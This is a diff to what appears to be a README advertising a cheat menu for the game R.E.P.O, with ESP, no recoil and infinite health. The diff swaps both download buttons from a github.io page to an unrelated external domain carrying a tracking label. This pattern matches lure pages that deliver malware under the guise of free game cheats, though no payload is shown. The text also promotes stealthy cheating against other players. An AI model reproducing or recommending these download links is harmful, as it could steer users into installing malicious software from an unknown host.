@@ -2,7 +2,7 @@
 
 The **R.E.P.O Cheat Menu** is a comprehensive external modding tool designed specifically for the high-octane action and tactical strategy of *R.E.P.O*. Whether you're breaching enemy compounds or engaging in intense firefights, this cheat menu gives you the tools to dominate every mission with ease.
 
-[![Download R.E.P.O CheatMenu](https://img.shields.io/badge/Download-R.E.P.O%20CheatMenu-blueviolet)](https://r-e-p-o-cheat-menu.github.io/.github/)
+[![Download R.E.P.O CheatMenu](https://img.shields.io/badge/Download-R.E.P.O%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
 
 Built with performance and stealth in mind, this menu includes features like ESP (Extra Sensory Perception), no recoil, infinite health, and more – all neatly packed into an easy-to-use, customizable interface.
 
@@ -35,4 +35,4 @@ Built with performance and stealth in mind, this menu includes features like ESP
 - **Hotkey Support** – Assign custom keys to any function for quick access.
 - **Performance Friendly** – Lightweight and optimized for high FPS.
 
-[![Download R.E.P.O CheatMenu](https://img.shields.io/badge/Download-R.E.P.O%20CheatMenu-blueviolet)](https://r-e-p-o-cheat-menu.github.io/.github/)
+[![Download R.E.P.O CheatMenu](https://img.shields.io/badge/Download-R.E.P.O%20CheatMenu-blueviolet)](https://axesetcibles.com?label=884fbd91c9b088d242082409ec43d985)
